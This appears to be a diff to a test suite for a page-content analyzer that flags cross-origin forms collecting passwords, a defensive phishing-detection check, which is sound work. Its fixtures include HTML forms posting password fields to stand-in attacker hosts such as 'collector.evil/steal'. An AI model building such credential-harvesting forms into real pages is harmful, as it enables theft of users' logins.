@@ -34,7 +34,46 @@ describe("analyzePageContent", () => {
     );
 
     expect(findings.crossOriginFormHosts).toEqual(["evil.example"]);
+    expect(findings.crossOriginPasswordFormHosts).toEqual(["evil.example"]);
     expect(findings.passwordInputCount).toBe(1);
+  });
+
+  it("associates password inputs with their owning form only", () => {
+    const html = `
+      <form action="/login" method="post"><input type="password" name="pw"></form>
+      <form action="https://news.collector.evil/subscribe" method="post"><input type="email"></form>
+    `;
+
+    const findings = analyzePageContent(html, FINAL_URL);
+
+    expect(findings.crossOriginFormHosts).toEqual(["news.collector.evil"]);
+    expect(findings.crossOriginPasswordFormHosts).toEqual([]);
+    expect(findings.passwordInputCount).toBe(1);
+  });
+
+  it("does not attribute password inputs outside any form to a closed form", () => {
+    const html = `
+      <form action="https://collector.evil/steal" method="post"></form>
+      <input type="password" name="stray">
+    `;
+
+    const findings = analyzePageContent(html, FINAL_URL);
+
+    expect(findings.crossOriginFormHosts).toEqual(["collector.evil"]);
+    expect(findings.crossOriginPasswordFormHosts).toEqual([]);
+  });
+
+  it("flags a cross-origin form that contains the password input", () => {
+    const html = `
+      <form action="https://collector.evil/steal" method="post">
+        <input type="text" name="user">
+        <input type="password" name="pw">
+      </form>
+    `;
+
+    const findings = analyzePageContent(html, FINAL_URL);
+
+    expect(findings.crossOriginPasswordFormHosts).toEqual(["collector.evil"]);
   });
 
   it("keeps relative form actions local with a same-origin document base", () => {
@@ -164,6 +203,7 @@ describe("analyzePageContent", () => {
     expect(findings).toEqual({
       title: null,
       crossOriginFormHosts: [],
+      crossOriginPasswordFormHosts: [],
       passwordInputCount: 0,
       iframeCount: 0,
       hiddenIframeCount: 0,
